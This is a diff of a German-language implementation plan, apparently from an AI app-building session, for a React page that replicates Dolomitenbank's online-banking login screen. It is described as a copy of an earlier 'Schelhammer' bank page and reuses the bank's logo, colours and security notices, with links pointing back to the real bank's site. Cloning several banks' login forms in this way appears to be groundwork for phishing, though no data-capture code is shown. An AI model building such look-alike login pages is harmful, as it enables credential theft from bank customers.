@@ -1,45 +1,23 @@
 
 
-## Neue Seite `/dolomitenbank` — Kopie von Schelhammer mit Anpassungen
+## Dolomitenbank — Links, Übersetzungen & "Hier" hervorheben
 
-### Vorbereitungen
-1. **Assets kopieren** — `user-uploads://logo-3.png` → `src/assets/dolomitenbank-logo.png`, `user-uploads://bg.png` → `src/assets/dolomitenbank-bg.png`
-2. **Route** — `/dolomitenbank` in `src/App.tsx`
+### Datei: `src/pages/Dolomitenbank.tsx`
 
-### Neue Datei: `src/pages/Dolomitenbank.tsx`
-Komplettkopie von `Schelhammer.tsx`, eigenständig, mit folgenden Änderungen:
+1. **"Hier" im Info-Text als Link** (Z.129-133):
+   - Deutsch: Text aufsplitten — "...Verfügernummer? - " dann `<a>Hier</a>` in `#637781` mit `hover:underline`, Link zu `https://www.dolomitenbank.at/m010/dolomitenbank/de/produkt/umstellung_dolomitenbanking.jsp`, dann " erfahren Sie..."
+   - Englisch: "Here" als Link zum selben Ziel
 
-1. **Header** — bleibt, Hintergrundfarbe `#52636b`, Logo = `dolomitenbank-logo.png`
+2. **Englische Übersetzungen anpassen** (Z.38, 46-47, 130-132):
+   - Login-Header: `"Login DolomitenBanking"` → `"Login"` (nur EN)
+   - Info-Text EN: `"You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."`
+   - Help-Text EN: `"Doesnt getting started work? Do you still have a authorised party number ? - Here you can find out how to get your new username / password. It is no longer possible to start with your previous authorised party number!"`
 
-2. **Hintergrundbild** — `dolomitenbank-bg.png`
+3. **Link-Redirects aktualisieren** (Z.151-176):
+   - Benutzername vergessen: `m=45` → `m=10`
+   - Passwort vergessen: `m=45` → `m=10`
+   - Mehr über das DolomitenBanking: `href="#"` → `href="https://www.dolomitenbank.at/private/dolomitenbanking-internetbanking/internetbanking-dolomitenbanking"`
 
-3. **Login-Header-Bar** — Hintergrund `#637781`, Text `"Login DolomitenBanking"` in `#edeff0`
-
-4. **Info-Text** (deutsch):
-   > Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Passwort oder einer TAN fragen.
-   - Englisch: sinngemäße Übersetzung
-
-5. **English-Toggle** — Farbe `#637781`
-
-6. **Eingabefelder**:
-   - Standard: Hintergrund `#e5e7e9`, Border `#e5e7e9`
-   - Focus: Hintergrund `#e5e7e9`, Border schwarz (`#000`)
-   - Kein boxShadow
-
-7. **Weiter-Button** — Hintergrund `#637781`, Textfarbe `#edeff0`
-
-8. **"Sie melden sich zum ersten Mal an?"** — entfernen
-
-9. **Terms-Text ersetzen** durch (schwarz):
-   > Funktioniert der Einstieg nicht? Haben Sie noch eine Verfügernummer? - Hier erfahren Sie wie Sie zu Ihrem neuem Benutzername / Passwort kommen. Ein Einstieg mit Ihrer bisherigen Verfügernummer ist nicht mehr möglich!
-   - Immer sichtbar (auch auf Englisch)
-
-10. **Links unten**:
-    - `"Benutzername vergessen?"` in `#637781`
-    - `"Passwort vergessen"` (ohne ?) in `#637781`
-    - Leerzeile
-    - `"Mehr über das DolomitenBanking"` in `#637781`
-
-### Datei: `src/App.tsx`
-- Import `Dolomitenbank` und Route `/dolomitenbank` hinzufügen
+4. **"Mehr über das DolomitenBanking" im Englischen ausblenden** (Z.170-176):
+   - Nur rendern wenn `lang === "de"`
 
